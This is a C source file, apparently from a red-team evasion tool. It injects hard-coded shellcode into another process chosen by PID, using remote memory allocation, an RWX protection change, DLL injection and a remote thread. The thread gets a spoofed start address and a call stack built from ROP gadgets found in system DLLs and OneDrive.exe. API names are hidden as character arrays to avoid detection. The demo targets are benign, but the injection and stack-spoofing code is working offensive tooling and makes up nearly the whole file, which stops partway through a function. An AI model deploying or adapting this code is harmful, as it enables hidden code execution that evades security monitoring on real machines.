#pragma once
#include "include/Common.h"
#include "include/Functions.h"
#include "include/Spoof.h"
#include <intrin.h>


// Define is output needs to be shown, you can disable it in "Common.h", to avoid _vsprinf symobol
#ifndef _OUTPUT
#define _OUTPUT 1
#endif // !_OUTPUT

// Define the target function
// 0: Sleep
// 1: MessageBox
// 2: ShellExecuteA
// 3: CreateProcessA

#define TARGET 1

#define SPOOF_CALL spoof_call

#define RESEARCH 0

#pragma intrinsic(_ReturnAddress)
#if (RESEARCH == 1)
#pragma comment(linker, "/ENTRY:research_main")
#else
#pragma comment(linker, "/ENTRY:main_main")
#endif


PSPOOFER sConfig;
PVOID returnAddress;
PVOID startAddress;

VOID FindSuitableChain();
BOOL CheckForGadget(HMODULE moduleBase, PERF pRuntimeFunction, PDWORD stackSize, PDWORD skip, DWORD gadgetType);
BOOL FindCallOffset(HMODULE moduleBase, PERF pRuntimeFunction, PDWORD pdwCallOffset, PUINT64 pCalledFunctionAddress, PDWORD skip);
BOOL CheckPushRbp(HMODULE moduleBase, PERF pRuntimeFunction, PDWORD stackSize);

// Entry Point
void research_main() {
    FindSuitableChain();

}

void main_main(int argc, char* argv[]) {
    PERF                pRuntimeFunctionTable;
    PERF                pRuntimeFunctionTableNotepad;
    PERF                pRuntimeFunctionTableWininet;
    DWORD               runtimeFunctionTableSize;
    DWORD               runtimeFunctionTableSizeNotepad;
    DWORD               runtimeFunctionTableSizeWininet;
    DWORD               rtSaveIndex;
    DWORD               rtLastIndex;
    DWORD               rtSaveIndexWininet;
    DWORD               rtLastIndexWininet;
    DWORD               rtLastIndexNotepad;
    DWORD               rtSaveIndexNotepad;
    DWORD               stackSize;
    DWORD               stackOffsetWhereRbpIsPushed;
    DWORD64             rtTargetOffset;
    DWORD64             rtTargetOffsetNotepad;
    HMODULE             kernel32Base;
    HMODULE             kernelBase;
    HMODULE             ntdllBase;
    BOOL                status;
    BOOL                checkpoint;
    HMODULE             msvcrt;
    HMODULE             user32;
    HMODULE             shell32;
    HMODULE             cryptsp;
    HMODULE             wininet;
    HMODULE             processImage;
    HANDLE              pHandle;
    DWORD               addRspGadget;
    DWORD               skip_jmp_gadget          = 0;
    DWORD               skip_stack_pivot_gadget  = 0;
    DWORD               skip_prolog_frame        = 0;
    DWORD               skip_pop_rsp_frame       = 0;
    DWORD               pPid                     = 0;
    // Needed for ensuring target modules are loaded
    DLL                 mainModule               = { 0 };
    LoadLibraryAType    LoadLibraryAFp;
    SleepType           SleepFp;
    KillProcType        TerminateProcessFp;

    CHAR                LoadLibraryAName[]       = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' };
    CHAR                SleepName[]              = { 'S', 'l', 'e', 'e', 'p', '\0' };
    CHAR                TerminateProcessName[]   = { 'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };
    CHAR                VirtualProtectName[]     = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0' };
    CHAR                SystemFunctionName[]     = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '2', '\0' };
    // Target Libraries
    CHAR                User32Name[]             = { 'U', 's', 'e', 'r', '3', '2', '\0' };
    CHAR                MsvCRTName[]             = { 'm', 's', 'v', 'c', 'r', 't', '\0' };
    CHAR                Shell32Name[]            = { 'S', 'h', 'e', 'l', 'l', '3', '2', '\0' };
    CHAR                CryptspName[]            = { 'c', 'r', 'y', 'p', 't', 's', 'p', '\0' };

    // Pseudo-Seed
    unsigned long int   seed;

    ntdllBase                                    = (HMODULE)GetModule(NTDLL_HASH);
    kernelBase                                   = (HMODULE)GetModule(KERNELBASE_HASH);
    kernel32Base                                 = (HMODULE)GetModule(KERNEL32DLL_HASH);
    wininet                                      = LoadLibraryA("Wininet");
    processImage                                 = LoadLibraryA("C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe");
    
    pRuntimeFunctionTable                        = (PERF)(GetExceptionDirectoryAddress(kernelBase, &runtimeFunctionTableSize));
    rtLastIndex                                  = (DWORD)(runtimeFunctionTableSize/12);
    pRuntimeFunctionTableWininet                  = (PERF)(GetExceptionDirectoryAddress(wininet, &runtimeFunctionTableSizeWininet));
    rtLastIndexWininet                            = (DWORD)(runtimeFunctionTableSizeWininet /12);
    pRuntimeFunctionTableNotepad                 = (PERF)(GetExceptionDirectoryAddress(processImage, &runtimeFunctionTableSizeNotepad));
    rtLastIndexNotepad                           = (DWORD)(runtimeFunctionTableSizeNotepad/12);
    rtSaveIndex                                  = 0;
    rtSaveIndexNotepad                           = 0;
    rtSaveIndexWininet                            = 0;
    stackSize                                    = 0;
    rtTargetOffset                               = 0;
    rtTargetOffsetNotepad                        = 0;
    status                                       = 0;
    checkpoint                                   = 0;
    addRspGadget                                 = ADD_RSP_0x38;

    LPSTR cmdline = GetCommandLineA();
    printf("[+] CLI: %s\n", cmdline);
    pPid = atoi(cmdline);
    printf("[+] PID: %d\n", pPid);
    pHandle = PICOpenProcess(pPid);

    PVOID remoteNotepad = (PVOID) GetRemoteImageBase(pPid);


    if (NULL == pHandle) {
        printf("[-] Failed to open process\n");
        return;
    }

    // Load LoadLibraryA to load additional modules
    LoadLibraryAFp                               = (LoadLibraryAType)GetSymbolAddress(kernel32Base, LoadLibraryAName);
    SleepFp                                      = (SleepType)GetSymbolAddress(kernel32Base, SleepName);
    TerminateProcessFp                           = (KillProcType)GetSymbolAddress(kernel32Base, TerminateProcessName);
    // Load msvcrt (for getchar)
    msvcrt                                       = LoadLibraryAFp((LPCSTR)MsvCRTName);
    // Load user32 (for MessageBox)
    user32                                       = LoadLibraryAFp((LPCSTR)User32Name);    
    // Load shell32 (for ShellExecute)
    shell32                                      = LoadLibraryAFp((LPCSTR)Shell32Name);
    // Load shell32 (for ShellExecute)
    cryptsp                                      = LoadLibraryAFp((LPCSTR)CryptspName);

    // Get main module 
    GetModuleTextSection(&mainModule);


    CHAR getcharName[] = { 'g', 'e', 't', 'c', 'h', 'a', 'r', '\0' };
    getcharType getcharFp;
    getcharFp = (getcharType)GetProcAddress(msvcrt, getcharName);

    // Init Spoofer Configuration

    UCHAR key[] = { 'M', 'y', 'T', 'e', 's', 't', '1', '\0' };
    
    sConfig = (PSPOOFER)malloc(sizeof(SPOOFER));
    custom_memset(sConfig, 0, sizeof(SPOOFER));

    MemCopy(&sConfig->Key, key, sizeof(key));

    sConfig->KeyStruct.MaximumLength = sizeof(key);
    sConfig->KeyStruct.Length = sizeof(key);
    sConfig->KeyStruct.Buffer = (PUCHAR) &sConfig->Key;

    sConfig->KeyStructPointer = (PVOID)&sConfig->KeyStruct;

    BYTE popRegsPattern[]     = { 0x59, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x41, 0x5B, 0xC3 };
    BYTE addRsp0x28Pattern[]  = { 0x48, 0x83, 0xc4, 0x28, 0xc3 };
    BYTE popRdxPattern[]      = { 0x5A, 0xC3 };
    BYTE retPattern[]         = { 0xC3, 0xCC };
    BYTE movRspR11Pattern[]   = { 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0x5f, 0x5d, 0xc3 };
    BYTE bigAddRspPattern[]   = { 0x48, 0x81, 0xc4, 0xCC, 0xCC, 0xCC, 0xCC, 0xc3 };

    
	HMODULE baseDlls[7] = {
		kernel32Base,
		ntdllBase,
		kernelBase,
        user32,
		msvcrt,
		shell32,
        cryptsp
	};
    int dllIndex = 0;
    // Save known gadgets
    while (sConfig->PopRdxGadget == NULL) {
		// Search for the POP RDX gadget in kernel32 and ntdll
		if (dllIndex > 6)
			break;
        SearchGadget(baseDlls[dllIndex], popRdxPattern, sizeof(popRdxPattern), &sConfig->PopRdxGadget, 0);
        dllIndex++;
    }
    
    PVOID superAddRspGadget = PICVirtualAllocEx(pHandle, 0x8, PAGE_READWRITE);
    printf("Allocated memory: 0x%p\n", superAddRspGadget);

    sConfig->RetGadget = (PVOID)((UINT64)sConfig->PopRdxGadget + 1);

    SearchGadget(ntdllBase, popRegsPattern, sizeof(popRegsPattern), &sConfig->PopRegsGadget, 0);
    SearchGadget(ntdllBase, addRsp0x28Pattern, sizeof(addRsp0x28Pattern), &sConfig->AddRsp28Gadget, 0);
    SearchGadget(ntdllBase, movRspR11Pattern, sizeof(movRspR11Pattern), &sConfig->MovRspR11Gadget, 0);

    PVOID localGadget;
    DWORD imm32 = NULL; 
    DWORD offset = 0;
    
    int dllIdx = 0;
    while (sConfig->SuperAddRspGadget == NULL) {
        while (SearchGadget(baseDlls[dllIdx], bigAddRspPattern, sizeof(bigAddRspPattern), &localGadget, &offset)) {
            imm32 = *(DWORD*)((BYTE*)localGadget + 3);

            if (imm32 > MINIMUM_JUMP_SIZE) {
                PICCopyMemory(pHandle, superAddRspGadget, &localGadget, 8);
                sConfig->SuperAddRspGadget = superAddRspGadget;
                sConfig->SuperAddRspGadgetSize = imm32;
                break;
            }
        }
        offset = 0;
        dllIdx++;
    }
    
    printf("POP RDX Gadget: 0x%I64x\n", sConfig->PopRdxGadget);
    printf("RET Gadget: 0x%I64x\n", sConfig->RetGadget);
    printf("POP REGS Gadget: 0x%I64x\n", sConfig->PopRegsGadget);
    printf("ADD RSP, 28h Gadget: 0x%I64x\n", sConfig->AddRsp28Gadget);
    printf("ADD RSP, 0x%04x Gadget: 0x%I64x\n", sConfig->SuperAddRspGadgetSize, sConfig->SuperAddRspGadget);
    printf("MOV RSP, R11 Gadget: 0x%I64x\n", sConfig->MovRspR11Gadget);


    sConfig->SystemFunction032Address = (PVOID)GetSymbolAddress(cryptsp, SystemFunctionName);
    sConfig->VirtualProtectAddress = (PVOID)GetSymbolAddress(kernel32Base, VirtualProtectName);

    // Configuring random seed
    seed = SEED;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // set the size of the structures
    custom_memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    custom_memset(&pi, 0, sizeof(pi));

    // Example parameters

    if (TARGET == 0) {
        // Config for getchar (No parameter)
        CHAR fname[] = {'S', 'l', 'e', 'e', 'p', 'E', 'x', '\0'};
        sConfig->SpoofFunctionPointer = (PVOID)GetSymbolAddress(kernelBase, (LPCSTR)fname);
        sConfig->Nargs = 2;
        sConfig->Arg01 = (PVOID)((UINT64)1000*500);
        sConfig->Arg02 = (PVOID)((UINT64)FALSE);

    }else if (TARGET == 1){    
        // Config for MessageBox (4 parameters: All registers)
        CHAR fname[] = {'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', '\0'};
        CHAR msg[]   = { 'T', 'h', 'i', 's', ' ', 'c', 'a', 'l', 'l', ' ', 'w', 'a', 's', ' ', 's', 'p', 'o', 'o', 'f', 'e', 'd', ' ', 's', 'u', 'c', 'c', 'e', 's', 's', 'f', 'u', 'l', 'l', 'y', '!', '\0'};
        CHAR title[] = { 'R', 'e', 's', 'u', 'l', 't', ' ', 'o', 'f', ' ', 't', 'h', 'e', ' ', 'c', 'a', 'l', 'l', '\0'};

        MemCopy(&sConfig->Message, msg, sizeof(msg));
        MemCopy(&sConfig->Title, title, sizeof(title));

        sConfig->SpoofFunctionPointer = (PVOID)GetSymbolAddress(user32, (LPCSTR)fname);
        sConfig->Nargs = 4;
        sConfig->Arg01 = NULL;
        sConfig->Arg02 = (PVOID)&sConfig->Title;
        sConfig->Arg03 = (PVOID)&sConfig->Message;
        sConfig->Arg04 = MB_OK;
    }else if (TARGET == 2){
        // Config for ShellExecuteA (6 parameters: All registers + 2 stack parameters)
        CHAR fname[] = { 'S', 'h', 'e', 'l', 'l', 'E', 'x', 'e', 'c', 'u', 't', 'e', 'A', '\0' };
        CHAR cmd[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', '\0' };
        sConfig->SpoofFunctionPointer = (PVOID)GetSymbolAddress(shell32, (LPCSTR)fname);
        sConfig->Nargs   = 6;
        sConfig->Arg01   = NULL;
        sConfig->Arg02   = NULL;
        sConfig->Arg03   = (PVOID) &cmd;
        sConfig->Arg04   = NULL;
        sConfig->Args[0] = NULL;
        sConfig->Args[1] = (PVOID)5;
    }else if (TARGET == 3){
        // Config for CreateProcessA (9 parameters: All registers + 5 stack parameters)
        CHAR fname[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', '\0' };
        CHAR cmd[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', '\0' };
        sConfig->Nargs = 10;
        sConfig->SpoofFunctionPointer = (PVOID)GetSymbolAddress(kernel32Base, (LPCSTR)fname);

        sConfig->Arg01   = (PVOID)NULL;                                        // Module name
        sConfig->Arg02   = (PVOID) &cmd;                                       // Command line
        sConfig->Arg03   = NULL;                                               // Process handle not inheritable
        sConfig->Arg04   = NULL;                                               // Thread handle not inheritable
        sConfig->Args[0] = (PVOID)FALSE;                                       // Set handle inheritance to FALSE
        sConfig->Args[1] = (PVOID)0;                                           // No creation flags
        sConfig->Args[2] = (PVOID)NULL;                                        // Use parent's environment block
        sConfig->Args[3] = (PVOID)NULL;                                        // Use parent's starting directory 
        sConfig->Args[4] = (PVOID)&si;                                         // Pointer to STARTUPINFO structure
        sConfig->Args[5] = (PVOID)&pi;                                         // Pointer to PROCESS_INFORMATION structure    
    }
    else {
        printf("Wrong target %s, specify `#define TARGET [0|1|2|3]\n", TARGET);
        return;
    }

    // If the call you want to spoof has arguments, please define them here
    // The gadget to restore RSP will get calculated using the number of arguments on the stack
    addRspGadget += (DWORD)((0x08 * sConfig->Nargs) << 0x20);

    // Zeroing out near variables
    custom_memset(&addRspGadget, 0, 8);
    
    // pHandle = PICOpenProcess(pPid);
    int length = 605;
    unsigned char shellcode[] = {
            0x48, 0x8b, 0xc4, 0x48, 0x89, 0x6c, 0x24, 0x08, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x49, 0x8b, 0xcf, 0x4c, 0x8b, 0xd9, 0x4d, 0x33, 0xff, 0x48, 0x89, 0x81,
            0xc0, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x59, 0x50, 0x48, 0x89, 0x5c, 0x24, 0x18, 0x48, 0x8b, 0xdc, 0x48, 0x83, 0xc3, 0x18, 0x48, 0x89, 0x99, 0xb0, 0x00,
            0x00, 0x00, 0x48, 0x8b, 0xec, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x41, 0xff, 0x73, 0x38, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xc5, 0x08,
            0x55, 0x48, 0x83, 0xed, 0x08, 0x41, 0x52, 0x41, 0x51, 0x41, 0x50, 0x51, 0x41, 0xff, 0x73, 0x28, 0x52, 0x41, 0xff, 0x73, 0x20, 0x48, 0x83, 0xec, 0x28,
            0x41, 0xff, 0x73, 0x30, 0x48, 0x83, 0xec, 0x28, 0x41, 0xff, 0x73, 0x30, 0x41, 0xff, 0x73, 0x10, 0x6a, 0x01, 0x6a, 0x01, 0x41, 0xff, 0x73, 0x18, 0x6a,
            0x20, 0x41, 0xff, 0x33, 0x41, 0xff, 0x73, 0x28, 0x41, 0xff, 0x73, 0x60, 0x41, 0xff, 0x73, 0x20, 0x48, 0x83, 0xec, 0x28, 0x41, 0xff, 0x73, 0x30, 0x41,
            0xff, 0x73, 0x08, 0x6a, 0x01, 0x6a, 0x01, 0x6a, 0x01, 0x6a, 0x01, 0x41, 0xff, 0xb3, 0xa0, 0x00, 0x00, 0x00, 0x41, 0xff, 0x73, 0x28, 0x41, 0xff, 0xb3,
            0x98, 0x00, 0x00, 0x00, 0x41, 0xff, 0x73, 0x20, 0x48, 0x83, 0xec, 0x28, 0x41, 0xff, 0x73, 0x30, 0x41, 0xff, 0x73, 0x10, 0x6a, 0x01, 0x6a, 0x01, 0x41,
            0xff, 0x73, 0x18, 0x6a, 0x40, 0x41, 0xff, 0x33, 0x41, 0xff, 0x73, 0x28, 0x41, 0xff, 0x73, 0x60, 0x41, 0xff, 0x73, 0x20, 0x48, 0x8b, 0x99, 0x98, 0x01,
            0x00, 0x00, 0x48, 0x2b, 0x99, 0xa0, 0x01, 0x00, 0x00, 0x48, 0x85, 0xdb, 0x75, 0x02, 0xeb, 0x0c, 0xff, 0xb1, 0xa8, 0x01, 0x00, 0x00, 0x48, 0x83, 0xeb,
            0x08, 0xeb, 0xed, 0xff, 0xb1, 0x90, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x1c, 0x24, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40,
            0x10, 0x48, 0x03, 0x41, 0x40, 0x50, 0x48, 0x33, 0xc0, 0x48, 0x8b, 0x41, 0x70, 0x48, 0x01, 0x04, 0x24, 0x48, 0x8b, 0x81, 0xc0, 0x00, 0x00, 0x00, 0x48,
            0x2b, 0x41, 0x68, 0x48, 0x2b, 0x61, 0x78, 0x4c, 0x8b, 0x91, 0xa8, 0x00, 0x00, 0x00, 0x4a, 0x89, 0x04, 0x14, 0xff, 0x71, 0x48, 0x48, 0x8b, 0x81, 0x80,
            0x00, 0x00, 0x00, 0x48, 0x01, 0x04, 0x24, 0x48, 0x8b, 0x81, 0x90, 0x00, 0x00, 0x00, 0x48, 0x2b, 0xa1, 0x88, 0x00, 0x00, 0x00, 0xff, 0xb1, 0xb0, 0x00,
            0x00, 0x00, 0x48, 0x2b, 0xe0, 0x4c, 0x8b, 0x51, 0x50, 0x4c, 0x89, 0x14, 0x04, 0xff, 0x71, 0x58, 0x48, 0x8b, 0x81, 0x90, 0x00, 0x00, 0x00, 0x48, 0x89,
            0x45, 0x28, 0x48, 0x8b, 0x81, 0xb8, 0x00, 0x00, 0x00, 0xeb, 0x00, 0x4c, 0x8b, 0xc8, 0x4c, 0x8b, 0x81, 0xc8, 0x00, 0x00, 0x00, 0x49, 0x83, 0xf8, 0x04,
            0x7e, 0x1b, 0x48, 0xc7, 0xc0, 0x08, 0x00, 0x00, 0x00, 0x49, 0xf7, 0xe0, 0x4c, 0x8b, 0xbc, 0x01, 0xc8, 0x00, 0x00, 0x00, 0x4c, 0x89, 0x3c, 0x04, 0x49,
            0xff, 0xc8, 0xeb, 0xdf, 0x49, 0x91, 0x4c, 0x8b, 0x89, 0xe8, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x81, 0xe0, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x91, 0xd8, 0x00,
            0x00, 0x00, 0x48, 0x8b, 0x89, 0xd0, 0x00, 0x00, 0x00, 0xeb, 0x00, 0x50, 0x41, 0x53, 0x41, 0x52, 0x41, 0x51, 0x41, 0x50, 0x51, 0x41, 0xff, 0x73, 0x28,
            0x52, 0x41, 0xff, 0x73, 0x20, 0x48, 0x83, 0xec, 0x28, 0x41, 0xff, 0x73, 0x30, 0x48, 0x83, 0xec, 0x28, 0x41, 0xff, 0x73, 0x30, 0x41, 0xff, 0x73, 0x10,
            0x6a, 0x01, 0x6a, 0x01, 0x41, 0xff, 0x73, 0x18, 0x6a, 0x01, 0x41, 0xff, 0x33, 0x41, 0xff, 0x73, 0x28, 0x41, 0xff, 0x73, 0x60, 0x41, 0xff, 0x73, 0x20,
            0x48, 0x83, 0xec, 0x28, 0x41, 0xff, 0x73, 0x30, 0x41, 0xff, 0x73, 0x08, 0x6a, 0x01, 0x6a, 0x01, 0x6a, 0x01, 0x6a, 0x01, 0x41, 0xff, 0xb3, 0xa0, 0x00,
            0x00, 0x00, 0x41, 0xff, 0x73, 0x28, 0x41, 0xff, 0xb3, 0x98, 0x00, 0x00, 0x00, 0x41, 0xff, 0x73, 0x20, 0x48, 0x83, 0xec, 0x28, 0x41, 0xff, 0x73, 0x30,
            0x41, 0xff, 0x73, 0x10, 0x6a, 0x01, 0x6a, 0x01, 0x41, 0xff, 0x73, 0x18, 0x6a, 0x40, 0x41, 0xff, 0x33, 0x41, 0xff, 0x73, 0x28, 0x41, 0xff, 0x73, 0x60,
            0x41, 0xff, 0x73, 0x20, 0xc3
    };


    if (NULL == pHandle) {
        printf("[-] Failed to open process\n");
        return;
    }

    LPVOID mem = PICVirtualAllocEx(pHandle, 4096, PAGE_READWRITE);
    PICCopyMemory(pHandle, mem, shellcode, length);

    if (!PICVirtualProtectEx(pHandle, mem, 4096, PAGE_EXECUTE_READWRITE)) {
		printf("[-] Failed to set memory protection: %08x\n", GetLastError());
        return;
    }

    LPVOID rwmem = PICVirtualAllocEx(pHandle, 4096, PAGE_READWRITE);

    CHAR libName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'c', 'r', 'y', 'p', 't', 's', 'p', '.', 'd', 'l', 'l', '\0' };
    
    PICCopyMemory(pHandle, rwmem, libName, sizeof(libName));
    PICInjectDllProcess(pHandle, rwmem);

    sConfig->DataStruct.MaximumLength = sConfig->DataStruct.Length = length;
    sConfig->DataStruct.Buffer = (PUCHAR)mem;

    sConfig->DataStructPointer = (PVOID)&sConfig->DataStruct;

    sConfig->CodeBaseAddress = (PVOID)mem;
    sConfig->CodeBaseSize = (UINT64)length;

    DWORD oldProtect;
    sConfig->OldProtection = &oldProtect;

    printf("CodeBaseAddress 0x%I64X\n", mem);
    printf("CodeBaseSize 0x%I64X\n", length);

    // Setting return address
    //returnAddress = (PVOID)_ReturnAddress();
    printf("_ReturnAddress() is: 0x%p\n", _ReturnAddress());
    printf("_AddressOfReturnAddress() is: 0x%p\n", _AddressOfReturnAddress());

    PVOID btit = (PVOID)GetProcAddress(kernel32Base, "BaseThreadInitThunk");
    if (btit == NULL) {
        printf("Failed to find BaseThreadInitThunk function address: %08x\n", GetLastError());
        return;
    }

    DWORD callOffset = FindCallInstructionOffset((uint64_t)btit, 0x30);
	if (callOffset == 0) {
		printf("Failed to find call offset for BaseThreadInitThunk\n");
		return;
	}
	returnAddress = (PVOID)((uint64_t)callOffset + (uint64_t)btit);
	printf("BaseThreadInitThunk+0x17 address: 0x%I64X\n", returnAddress);

    // Must be given as a stack pointer
    sConfig->ReturnAddress = (PVOID)returnAddress;
    printf("Return address: 0x%I64X\n", sConfig->ReturnAddress);
    
    printf("Address of Function to spoof: 0x%I64X\n", sConfig->SpoofFunctionPointer);
    BYTE test = -1;
    HANDLE hThread;

    for (int iterations = 0; iterations < 10; iterations++) {

        printf("\n  ------------------------------------ \n");
        kernelBase = (HMODULE)GetModule(KERNELBASE_HASH);

        FindProlog(processImage, pRuntimeFunctionTableNotepad, rtLastIndexNotepad, &stackSize, &rtSaveIndexNotepad, &rtTargetOffsetNotepad);
        if (sConfig->FirstFrameSize == 0 || (UINT64)sConfig->FirstFrameFunctionPointer > 0x7FFFFFFFFFFF) {
            continue;
            iterations--;
        }
        //stackOffsetWhereRbpIsPushed = FindPushRbp(notepad, pRuntimeFunctionTableNotepad, rtLastIndexNotepad, &stackSize, &rtSaveIndexNotepad, &skip_pop_rsp_frame, &rtTargetOffsetNotepad);
        //stackOffsetWhereRbpIsPushed = FindPushRbp(kernelBase, pRuntimeFunctionTable, rtLastIndex, &stackSize, &rtSaveIndex, &skip_pop_rsp_frame, &rtTargetOffsetNotepad);
        stackOffsetWhereRbpIsPushed = FindPushRbp(wininet, pRuntimeFunctionTableWininet, rtLastIndexWininet, &stackSize, &rtSaveIndexWininet, &skip_pop_rsp_frame, &rtTargetOffsetNotepad);

        printf("PUSH RBP offset: 0x%X\n", stackOffsetWhereRbpIsPushed);

        skip_stack_pivot_gadget = 3;
        //FindGadget(wininet, pRuntimeFunctionTableWininet, rtLastIndexWininet, &stackSize, &rtSaveIndexWininet, &skip_jmp_gadget, 2);
        if (sConfig->JmpRbxGadget == NULL) {
            FindGadget(wininet, pRuntimeFunctionTableWininet, rtLastIndexWininet, &stackSize, &rtSaveIndexWininet, &skip_jmp_gadget, 0);
        }
        // Fallback if the gadget in wininet is not found
        if (sConfig->JmpRbxGadget == NULL) {
            FindGadget(kernelBase, pRuntimeFunctionTable, rtLastIndex, &stackSize, &rtSaveIndex, &skip_jmp_gadget, 3);
            sConfig->JmpRbxGadget = (PVOID)((UINT64)sConfig->JmpRbxGadget);
        }
        else {
            sConfig->JmpRbxGadget = (PVOID)((UINT64)sConfig->JmpRbxGadget - 0x2);
        }
        FindGadget(kernelBase, pRuntimeFunctionTable, rtLastIndex, &stackSize, &rtSaveIndex, &skip_stack_pivot_gadget, 1);

        sConfig->TotalStackSize = sConfig->SecondFrameSize + sConfig->JmpRbxGadgetFrameSize + 0x10;

        sConfig->FirstFrameFunctionPointer = (PVOID)((UINT64)sConfig->FirstFrameFunctionPointer - (UINT64)processImage);

        startAddress = (PVOID)((UINT64)sConfig->FirstFrameFunctionPointer + (UINT64)remoteNotepad);

        
        printf("Fake Start Address: 0x%I64x\n", (UINT64)startAddress);

        // Every time we generate a new random offset
        sConfig->FirstFrameRandomOffset = FindCallInstructionOffset((uint64_t)(UINT64)sConfig->FirstFrameFunctionPointer + (UINT64)processImage, 0x100);
        sConfig->SecondFrameRandomOffset = FindCallInstructionOffset((uint64_t)sConfig->SecondFrameFunctionPointer, 0x100);

        printf("Config Address: 0x%I64x\n", (UINT64)sConfig);

        PrintConfig(sConfig);

        sConfig->KeyStruct.Buffer = (PUCHAR)((UINT64)rwmem + 0x1B0);
        sConfig->KeyStructPointer = (PVOID)((UINT64)rwmem + 0x1D8);
        sConfig->DataStructPointer = (PVOID)((UINT64)rwmem + 0x1E8);
        sConfig->OldProtection = (PVOID)((UINT64)rwmem + 0x18);

        sConfig->Arg02 = (PVOID)((UINT64)rwmem + 0x1F8);
        sConfig->Arg03 = (PVOID)((UINT64)rwmem + 0x220);


        
        PICCopyMemory(pHandle, rwmem, sConfig, sizeof(SPOOFER));

        //PrintConfig((PSPOOFER)rwmem);
        printf("-------------------------------------------------------------------------\n");
        printf("                       BEFORE SHELLCODE EXECUTION                        \n");
        printf("-------------------------------------------------------------------------\n");
        printf("[DEBUG] Thread Start Address: 0x%p\n", startAddress);
        printf("[DEBUG] Shellcode in memory at: 0x%p\n", mem);
        printf("[DEBUG] Shellcode config in memory at: 0x%p\n", rwmem);
        printf("-------------------------------------------------------------------------\n");
        printf("[*] Press a char to continue...\n");
        getcharFp();

        hThread = PICCreateRemoteThread(pHandle, mem, startAddress, rwmem);

        printf("-------------------------------------------------------------------------\n");
        printf("                       AFTER SHELLCODE EXECUTION                         \n");
        printf("-------------------------------------------------------------------------\n");
        printf("[DEBUG] Shellcode in memory at: 0x%p\n", mem);
        printf("[DEBUG] Shellcode config in memory at: 0x%p\n", rwmem);
        printf("-------------------------------------------------------------------------\n");
        printf("[*] Press a char to continue...\n");
        getcharFp();


        if (TARGET == 3){
            printf("Process: ");
            printf("0x%I64x\n", pi.hProcess);
            TerminateProcessFp(pi.hProcess, 0);
        }
    }
}


DWORD FindProlog(HMODULE moduleBase, PERF pRuntimeFunctionTable, DWORD rtLastIndex, PDWORD stackSize, PDWORD prtSaveIndex, PDWORD64 rtTargetOffset) {
    PUNWIND_INFO unwindInfo;
    BOOL         saFound    = FALSE;
    DWORD        status     = 0;
    DWORD        startIndex = *prtSaveIndex;
    *stackSize = 0;

    for (DWORD i = *prtSaveIndex + 1; i < rtLastIndex; i++)
    {

        unwindInfo = (PUNWIND_INFO)((UINT64)moduleBase + (DWORD)pRuntimeFunctionTable[i].UnwindData);
        
        /*
        if ((unwindInfo->Flags | UNW_FLAG_UHANDLER) != unwindInfo->Flags){
			// Skip unwind info that is not a prolog
			continue;
        }
        */

        status = GetStackFrameSize(moduleBase, (PVOID)unwindInfo, stackSize);
        if (*stackSize <= 0x48) {
            continue;
		}

        if (status != 0) {
            *prtSaveIndex = i;
            break;

            /*
            for (UINT64 j = (UINT64)moduleBase + pRuntimeFunctionTable[i].BeginAddress; j < (UINT64)moduleBase + pRuntimeFunctionTable[i].EndAddress; j++) {

                if (*(WORD*)j == 0xe1ff) {
                    saFound = TRUE;
                    startAddress = (PVOID)j;
                }
            }
            if(saFound){
                *prtSaveIndex = i;
                break;
            }
            */


        }
    }

    if (startIndex != *prtSaveIndex){
        printf("Module base 0x%I64X\n", moduleBase);
        printf("Module rt beginaddress 0x%I64X\n", (UINT64)pRuntimeFunctionTable[*prtSaveIndex].BeginAddress);

        *rtTargetOffset = (DWORD64)((UINT64)moduleBase + (UINT64)pRuntimeFunctionTable[*prtSaveIndex].BeginAddress);
        sConfig->FirstFrameFunctionPointer = (PVOID)*rtTargetOffset;
        sConfig->FirstFrameSize = *stackSize;
    }    
    
    printf("First Frame FP: 0x%I64X\n", *rtTargetOffset);
    printf("First Frame stack size: 0x%lx\n", *stackSize);

    printf("Return address: 0x%I64X\n", (ULONGLONG)(moduleBase + *stackSize));

    return status;
}



DWORD FindPushRbp(HMODULE moduleBase, PERF pRuntimeFunctionTable, DWORD rtLastIndex, PDWORD stackSize, PDWORD prtSaveIndex, PDWORD skip, PDWORD64 rtTargetOffset) {
    PUNWIND_INFO unwindInfo;
    DWORD        pdwCallOffset = 0;
    DWORD        status = 0;
    DWORD        suitableFrames = 0;
    *stackSize = 0;


    for (DWORD i = 0; i < rtLastIndex; i++)
    {

        unwindInfo = (PUNWIND_INFO)((UINT64)moduleBase + (DWORD)pRuntimeFunctionTable[i].UnwindData);
